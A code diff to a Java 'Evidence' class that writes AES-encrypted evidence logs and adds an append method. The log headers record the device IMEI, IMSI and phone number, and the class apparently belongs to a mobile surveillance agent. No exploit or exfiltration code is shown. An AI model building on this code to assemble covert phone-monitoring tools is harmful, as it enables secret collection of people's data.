@@ -81,6 +81,8 @@ final class Evidence {
 	/** The enc data. */
 	private byte[] encData;
 
+	private byte[] lastBlock;
+
 	/**
 	 * Instantiates a new evidence.
 	 */
@@ -90,6 +92,7 @@ final class Evidence {
 
 		progressive = -1;
 		timestamp = new Date();
+
 	}
 
 	/**
@@ -110,6 +113,8 @@ final class Evidence {
 		this.aesKey = aesKey;
 
 		encryption = new Encryption(aesKey);
+		lastBlock = new byte[encryption.getBlockSize()];
+
 		// if(Cfg.DEBUG) Check.ensures(agent != null, "createLog: agent null"); //$NON-NLS-1$
 		if (Cfg.DEBUG) {
 			Check.ensures(encryption != null, "encryption null"); //$NON-NLS-1$
@@ -164,7 +169,8 @@ final class Evidence {
 
 		if (fconn != null && fconn.exists()) {
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (close): " + EvidenceCollector.decryptName(fconn.getName()));
+				// Check.log(TAG + " (close): " +
+				// EvidenceCollector.decryptName(fconn.getName()));
 			}
 			ret = fconn.dropExtension(EvidenceCollector.LOG_TMP);
 			if (!ret) {
@@ -177,11 +183,10 @@ final class Evidence {
 				Check.log(TAG + " (close): fconn == null || !fconn.exists()");
 			}
 		}
-		
-		if(Cfg.DEMO){
-			//Beep.bip();
-		}
 
+		if (Cfg.DEMO) {
+			// Beep.bip();
+		}
 
 		encData = null;
 		fconn = null;
@@ -323,7 +328,7 @@ final class Evidence {
 	public byte[] makeDescription(final byte[] additionalData, final int evidenceType) {
 
 		if (timestamp == null) {
-		 timestamp = new Date();
+			timestamp = new Date();
 		}
 
 		int additionalLen = 0;
@@ -350,7 +355,7 @@ final class Evidence {
 		evidenceDescription.lTimeStamp = datetime.lowDateTime();
 		evidenceDescription.additionalData = additionalLen;
 		evidenceDescription.deviceIdLen = WChar.getBytes(device.getImei()).length;
-		evidenceDescription.userIdLen   = WChar.getBytes(device.getImsi()).length;
+		evidenceDescription.userIdLen = WChar.getBytes(device.getImsi()).length;
 		evidenceDescription.sourceIdLen = WChar.getBytes(device.getPhoneNumber()).length;
 
 		final byte[] baseHeader = evidenceDescription.getBytes();
@@ -382,7 +387,7 @@ final class Evidence {
 	 * @return true, if successful
 	 */
 	public boolean writeEvidence(final byte[] data) {
-		return writeEvidence(data, 0);
+		return writeEvidence(data, 0, data.length);
 	}
 
 	/**
@@ -396,20 +401,21 @@ final class Evidence {
 	 *            the offset
 	 * @return true, if successful
 	 */
-	public synchronized boolean writeEvidence(final byte[] data, final int offset) {
+	public synchronized boolean writeEvidence(final byte[] data, final int offset, int len) {
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (writeEvidence) len: " + data.length + " offset: " + offset);
+			// Check.log(TAG + " (writeEvidence) len: " + data.length +
+			// " offset: " + offset);
 		}
-		
+
 		if (!enoughSpace) {
 			return false;
 		}
-		
-		if(offset>=data.length){
+
+		if (offset >= data.length) {
 			return false;
 		}
 
-		encData = encryption.encryptData(data, offset);
+		encData = encryption.encryptData(data, offset, len);
 
 		if (fconn == null) {
 			if (Cfg.DEBUG) {
@@ -448,7 +454,7 @@ final class Evidence {
 		int totalLen = 0;
 		for (byte[] bs : byteList) {
 			totalLen += bs.length;
-		}		
+		}
 
 		final int offset = 0;
 		final byte[] buffer = new byte[totalLen];
@@ -457,8 +463,56 @@ final class Evidence {
 		for (byte[] bs : byteList) {
 			databuffer.write(bs);
 		}
-		
+
 		return writeEvidence(buffer);
+	}
+
+	public boolean appendEvidence(byte[] data, int offset, int len) {
+		if (Cfg.DEBUG) {
+			// Check.log(TAG + " (writeEvidence) len: " + data.length +
+			// " offset: " + offset);
+		}
+
+		if (!enoughSpace) {
+			return false;
+		}
+
+		if (fconn == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: fconn null");//$NON-NLS-1$
+			}
+			return false;
+		}
+
+		try {
+			if (data == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (appendEvidence) just the size");
+				}
+				fconn.append(ByteArray.intToByteArray(len));
+			} else {
+				if (offset >= data.length) {
+					return false;
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (appendEvidence) append block");
+				}
+				encData = encryption.appendData(data, offset, len, lastBlock);
+				fconn.append(encData);
+			}
+			fconn.flush();
+		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: Error writing file: " + e);//$NON-NLS-1$
+			}
+			return false;
+		}
+
+		return true;
 	}
 
 	/**
@@ -469,7 +523,6 @@ final class Evidence {
 	public byte[] getEncData() {
 		return encData;
 	}
-
 
 	/**
 	 * Atomic write once.
@@ -490,17 +543,17 @@ final class Evidence {
 			close();
 		}
 	}
-	
+
 	public void atomicWriteOnce(ArrayList<byte[]> byteList) {
 		createEvidence(null);
-        writeEvidences(byteList);
-        close();
+		writeEvidences(byteList);
+		close();
 	}
-	
+
 	public void atomicWriteOnce(byte[] content) {
 		createEvidence(null);
-        writeEvidence(content);
-        close();
+		writeEvidence(content);
+		close();
 	}
 
 	@Override
@@ -511,6 +564,5 @@ final class Evidence {
 			return Integer.toString(progressive);
 		}
 	}
-
 
 }
